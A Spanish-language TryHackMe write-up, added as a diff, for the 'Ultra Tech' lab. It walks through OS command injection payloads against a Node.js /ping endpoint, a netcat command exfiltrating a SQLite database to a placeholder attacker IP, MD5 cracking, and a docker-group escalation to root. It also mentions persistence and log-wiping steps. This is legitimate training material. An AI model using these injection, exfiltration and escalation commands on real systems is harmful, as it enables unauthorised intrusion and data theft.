@@ -1,0 +1,253 @@
+---
+title: 'Ultra Tech'
+description: 'Análisis de JavaScript del lado cliente, OS command injection a través de una API, cracking de un hash MD5 y escalada de privilegios.'
+publishDate: 2026-09-04
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - privesc
+---
+
+**Dificultad:** Medium **Categoría:** Enumeración web, análisis de código JavaScript del lado del cliente, OS Command Injection, cracking de hash MD5, escalada de privilegios vía pertenencia al grupo `docker` (GTFOBins) **Sala:** [https://tryhackme.com/room/ultratech1](https://tryhackme.com/room/ultratech1)
+
+## Descripción de la sala
+
+Máquina inspirada en un pentest real (según su creador), que simula la infraestructura de una empresa de desarrollo web ficticia («UltraTech»). Combina el análisis del código JavaScript de una aplicación web para descubrir un endpoint de API interno, una vulnerabilidad de **inyección de comandos del sistema operativo (OS Command Injection)** en dicho endpoint, extracción y cracking de credenciales desde una base de datos SQLite filtrada, y una escalada de privilegios clásica basada en la pertenencia al **grupo `docker`** — una de las formas más comunes y peligrosas de obtener root en sistemas Linux mal configurados.
+
+> **Nota sobre placeholders:** se usa `{IP}` / `target` para representar la IP asignada por TryHackMe (cambia en cada despliegue; estos apuntes muestran `TARGET_IP` como ejemplo de una sesión concreta). `{ATTACKER_IP}` representa la IP de la máquina atacante, si se necesita para exfiltrar el archivo de base de datos por red en vez de leerlo directamente vía la inyección.
+
+---
+
+## 1. Preparación del entorno
+
+```bash
+mkdir -p ultratech/{scans,content,scripts,loot,exploits} && cd ultratech
+settarget {IP}
+```
+
+---
+
+## 2. Escaneo de puertos
+
+```bash
+nmap -p- -sV -sC -T4 -oG scans/allports target
+extractPorts scans/allports
+```
+
+- `-p-`: escanea todos los puertos TCP.
+- `-sV -sC`: detección de versión y scripts por defecto.
+- `-T4`: temporización agresiva.
+- `-oG`: salida «grepable» para `extractPorts`.
+
+**Puertos esperados:**
+
+| Puerto    | Servicio                                                      |
+| --------- | ------------------------------------------------------------- |
+| 22/tcp    | SSH                                                           |
+| 31331/tcp | HTTP (Apache) — sitio web principal, en un puerto no estándar |
+| 8081/tcp  | HTTP (Node.js) — API interna                                  |
+
+La presencia de **dos servicios HTTP distintos**, en puertos poco habituales, sugiere una arquitectura típica de aplicación web moderna: un frontend (puerto 31331) que consume datos de una **API backend** independiente (puerto 8081).
+
+---
+
+## 3. Enumeración web y análisis del código JavaScript
+
+Al visitar `http://target:31331/`, se carga el sitio principal de UltraTech, con una página de login/estado del servicio. Como el sitio es una aplicación web moderna, gran parte de su lógica reside en archivos **JavaScript del lado del cliente**, cargados por el navegador — y esos archivos son perfectamente legibles por cualquier visitante, incluido un atacante.
+
+```bash
+curl -s http://target:31331/js/api.js
+```
+
+Dentro de `api.js` se encuentra el código que gestiona las llamadas de la página hacia la API backend, incluyendo una función que verifica periódicamente el estado («ping») del servidor:
+
+```javascript
+fetch(`http://${getAPIURL()}/ping?ip=${window.location.hostname}`);
+```
+
+Esto revela dos datos clave:
+
+1. La API corre en el puerto **8081** (confirmado también por el escaneo de nmap).
+2. Existe un endpoint **`/ping`** que recibe un parámetro **`ip`**, y que presumiblemente ejecuta internamente un comando `ping` real del sistema operativo contra la IP proporcionada — un patrón de diseño **extremadamente propenso a inyección de comandos** si no se sanitiza correctamente la entrada del usuario.
+
+---
+
+## 4. Confirmando y explotando el Command Injection
+
+### 4.1 Prueba inicial del endpoint
+
+```bash
+curl "http://target:8081/ping?ip=google.com"
+```
+
+El servidor responde con la salida real del comando `ping` ejecutado contra `google.com`, confirmando que el parámetro `ip` se pasa directamente a una llamada de sistema.
+
+### 4.2 Inyectando comandos adicionales
+
+Al tratarse de una aplicación construida en Node.js, muchas implementaciones ingenuas de este tipo de «ping checker» usan internamente la función `child_process.exec()` de Node, concatenando directamente el texto del usuario dentro de la cadena del comando de shell — sin ningún tipo de validación o escape. Esto permite inyectar comandos adicionales usando los separadores de shell habituales: `;`, `&&`, `|`, o **backticks** (`` ` ``, que en Bash indican sustitución de comando: todo lo que esté entre backticks se ejecuta primero y su salida se sustituye en el lugar donde aparecían).
+
+```bash
+curl "http://target:8081/ping?ip=google.com;\`ls\`"
+```
+
+O, de forma equivalente y más directa (sin necesidad del `;` previo, ya que las backticks se evalúan independientemente de la posición dentro del argumento):
+
+```bash
+curl "http://target:8081/ping?ip=\`ls\`"
+```
+
+- El texto entre backticks (`ls`) se ejecuta como un comando de shell independiente **antes** de que el resto de la cadena se use como argumento del comando `ping` original — el resultado es que la salida del `ls` aparece reflejada en la respuesta HTTP.
+
+Al probar esto, se descubre en el listado de archivos del directorio de trabajo del servidor un archivo relevante:
+
+```
+utech.db.sqlite
+```
+
+### 4.3 Leer el contenido de la base de datos filtrada
+
+```bash
+curl "http://target:8081/ping?ip=google.com;\`cat utech.db.sqlite\`"
+```
+
+> Nota: como `utech.db.sqlite` es un archivo binario (base de datos SQLite), su volcado directo vía `cat` en una respuesta HTTP de texto puede mostrarse con caracteres extraños/ilegibles alrededor de las partes en texto plano (como las credenciales), pero suele ser suficiente para extraer las cadenas relevantes a simple vista. Si el resultado es demasiado ilegible, una alternativa más limpia (documentada en varias resoluciones públicas de esta sala) es **exfiltrar el archivo completo por red** hacia la máquina atacante, usando la misma vulnerabilidad de inyección para invocar `nc`:
+>
+> ```bash
+> # En la máquina atacante, primero:
+> nc -lvnp 4444 > utech.db.sqlite
+>
+> # Disparando la exfiltración a través de la inyección:
+> curl "http://target:8081/ping?ip=google.com;\`nc {ATTACKER_IP} 4444 < utech.db.sqlite\`"
+> ```
+>
+> Una vez descargado el archivo completo localmente, se puede inspeccionar correctamente con el cliente de `sqlite3`: `sqlite3 utech.db.sqlite ".dump"`.
+
+En cualquiera de los dos casos, el contenido revela una tabla de usuarios con dos cuentas y sus respectivos hashes de contraseña:
+
+```
+r00t  : f357a0c52799563c7c7b76c1e7543a32
+admin : 0d0ea5111e3c1def594c1684e3b9be84
+```
+
+> Nota: el usuario `r00t` es un nombre de cuenta regular del sistema (elegido deliberadamente parecido a «root» como distractor/broma de la sala) — **no** es la cuenta real de superusuario del sistema operativo.
+
+---
+
+## 5. Cracking del hash
+
+El hash de `r00t` (`f357a0c52799563c7c7b76c1e7543a32`) tiene 32 caracteres hexadecimales, formato característico de **MD5**. Se puede confirmar el tipo exacto de hash con la receta «Analyse Hash» de [CyberChef](https://gchq.github.io/CyberChef/), y crackearlo directamente con [CrackStation](https://crackstation.net/) (efectivo aquí por tratarse de MD5 sin salt) o localmente:
+
+```bash
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+**Contraseña obtenida:**
+
+```
+usuario: r00t
+contraseña: n100906
+```
+
+---
+
+## 6. Acceso SSH
+
+```bash
+ssh r00t@target
+# contraseña: n100906
+```
+
+```bash
+id
+```
+
+Al ejecutar `id`, se observa que el usuario `r00t` pertenece, entre otros, al grupo **`docker`** — el hallazgo clave para la escalada de privilegios.
+
+---
+
+## 7. Escalada de privilegios — abuso del grupo `docker`
+
+### 7.1 ¿Por qué pertenecer al grupo `docker` equivale a ser root?
+
+El **daemon de Docker** (`dockerd`) se ejecuta con privilegios de **root**, y por diseño, cualquier usuario que pueda comunicarse con ese daemon (normalmente a través del socket `/var/run/docker.sock`, al cual pertenecer al grupo `docker` da acceso de lectura/escritura) tiene, en la práctica, **control root implícito sobre todo el sistema anfitrión** — no porque Docker tenga una vulnerabilidad, sino porque su propio modelo de permisos así lo permite por diseño: un contenedor puede montarse con acceso de lectura/escritura a **cualquier ruta del sistema de archivos del host**, incluida la raíz `/` completa.
+
+Esta técnica está ampliamente documentada, incluyendo en **GTFOBins** ([https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)), en su sección de «Shell»/pertenencia al grupo `docker`.
+
+### 7.2 Explotación
+
+```bash
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+```
+
+Desglose completo del comando:
+
+- `docker run`: crea y ejecuta un nuevo contenedor.
+- `-v /:/mnt`: monta el sistema de archivos **raíz completo del host** (`/`) dentro del contenedor, en la ruta `/mnt`. Como el daemon de Docker corre como root, este montaje se realiza con privilegios de root, sin ninguna restricción — el contenedor puede leer y escribir absolutamente cualquier archivo del sistema real.
+- `--rm`: elimina automáticamente el contenedor al finalizar su ejecución (limpieza, no deja rastro de un contenedor «huérfano» corriendo).
+- `-it`: modo interactivo con pseudo-terminal asignado, para poder usar la shell resultante de forma normal.
+- `bash`: la imagen base a usar para crear el contenedor (cualquier imagen mínima con una shell disponible sirve; en algunos entornos puede ser necesario descargarla primero si no está en caché local, lo cual Docker hace automáticamente).
+- `chroot /mnt sh`: una vez dentro del contenedor, se ejecuta `chroot` sobre el punto de montaje `/mnt` (que es el sistema de archivos completo del host real) — esto cambia el directorio raíz aparente del proceso a `/mnt`, haciendo que, desde la perspectiva de la shell `sh` lanzada a continuación, el filesystem del host se convierta en la raíz `/` «normal» del propio contenedor. En la práctica, esto equivale a tener una shell root operando directamente sobre el disco del sistema anfitrión real.
+
+```bash
+whoami
+# root
+```
+
+### 7.3 Localizar y leer la clave privada de root
+
+```bash
+cd /root/.ssh
+ls -la
+cat id_rsa
+```
+
+Salida esperada (clave privada RSA completa):
+
+```
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBA...
+...
+-----END RSA PRIVATE KEY-----
+```
+
+El objetivo de la sala es, específicamente, capturar los **primeros caracteres** de esta clave privada como respuesta final (según la pregunta planteada en la tarea de TryHackMe), confirmando el control total sobre el sistema.
+
+---
+
+## 8. (Opcional) Pasos adicionales de post-explotación documentados por la comunidad
+
+Aunque no son necesarios para completar los objetivos de la sala, algunas writeups públicas amplían el ejercicio con pasos adicionales representativos de un pentest real más completo, como buena práctica educativa:
+
+- **Extraer `/etc/shadow`** para identificar todos los usuarios del sistema y sus hashes de contraseña.
+- **Crear un usuario adicional con privilegios de root** como mecanismo de persistencia (únicamente demostrativo en un entorno de laboratorio; nunca debe hacerse sin autorización explícita en un pentest real más allá de lo acordado con el cliente).
+- **Eliminar rastros/logs** de la actividad realizada, como ejercicio de las fases finales de un pentest (aunque en la práctica de TryHackMe esto no es necesario ni se evalúa).
+
+---
+
+## 9. Resumen de la cadena de ataque
+
+1. **Reconocimiento** con `nmap` → SSH (22), HTTP principal (31331), API Node.js (8081).
+2. **Análisis del JavaScript del cliente** (`api.js`) → revela el endpoint `/ping?ip=...` de la API interna.
+3. **OS Command Injection** en el parámetro `ip` (usando backticks para sustitución de comandos) → se listan archivos del servidor y se descubre `utech.db.sqlite`.
+4. **Extracción de la base de datos** (vía `cat` directo o exfiltración por `nc`) → revela hashes MD5 de dos usuarios (`r00t`, `admin`).
+5. **Cracking del hash MD5** de `r00t` con CrackStation/`hashcat` → contraseña `n100906`.
+6. **Acceso SSH** como `r00t` → se detecta pertenencia al grupo `docker` mediante `id`.
+7. **Escalada de privilegios** montando el filesystem completo del host dentro de un contenedor Docker (`docker run -v /:/mnt ... chroot /mnt sh`) → shell root real sobre el sistema anfitrión.
+8. **Captura de la clave privada SSH de root** (`/root/.ssh/id_rsa`) como objetivo final de la sala.
+
+## 10. Lecciones aprendidas / conceptos clave
+
+- **El código JavaScript del lado del cliente es completamente visible y auditable por cualquier visitante**: nunca se debe asumir que la lógica de negocio o los endpoints internos de una API están «ocultos» solo porque no aparecen enlazados directamente en el HTML — cualquier archivo `.js` cargado por el navegador puede (y debe) revisarse durante el reconocimiento.
+- **OS Command Injection en funcionalidades de «ping»/diagnóstico de red** es un patrón de vulnerabilidad extremadamente recurrente: cualquier funcionalidad que reciba una IP/hostname del usuario y la use para ejecutar comandos de red del sistema operativo (`ping`, `traceroute`, `nslookup`, etc.) es sospechosa por defecto y debe probarse con los separadores de shell habituales.
+- **Las bases de datos SQLite (u otros formatos de archivo) filtradas mediante RCE/Command Injection** pueden exfiltrarse de varias formas: lectura directa si el contenido es mayormente texto plano, o transferencia por red (`nc`, `curl` a un servidor propio, etc.) cuando el archivo es binario y necesita procesarse correctamente en el lado del atacante.
+- **La pertenencia al grupo `docker` es, en la práctica, equivalente a tener privilegios root completos** en el sistema anfitrión — un hecho a menudo subestimado en configuraciones de servidores reales, donde añadir un usuario al grupo `docker` «por comodidad» (para no tener que usar `sudo` en cada comando de Docker) es una práctica común pero peligrosa desde el punto de vista de seguridad.
+- **GTFOBins también documenta técnicas de escalada basadas en pertenencia a grupos** (no solo SUID, sudo o capabilities), como es el caso de `docker` — reforzando la importancia de revisar siempre `id`/`groups` como uno de los primeros pasos de cualquier enumeración post-explotación.
+
+## 11. Herramientas utilizadas
+
+`nmap`, `curl` (reconocimiento web e inyección de comandos), navegador (análisis de JavaScript), `netcat` (exfiltración opcional del archivo SQLite), `sqlite3` (inspección de la base de datos), CyberChef / CrackStation / `hashcat` (identificación y cracking del hash MD5), cliente `ssh`, `docker` (abuso vía GTFOBins).
+
+---
+
+_Writeup con fines académicos, elaborada a partir de apuntes propios de la resolución de la máquina «Ultra Tech» en TryHackMe, complementada con writeups públicas de la comunidad para explicar el análisis del JavaScript del cliente que revela el endpoint vulnerable, el mecanismo exacto de la inyección de comandos, y la técnica de escalada de privilegios vía pertenencia al grupo `docker`._
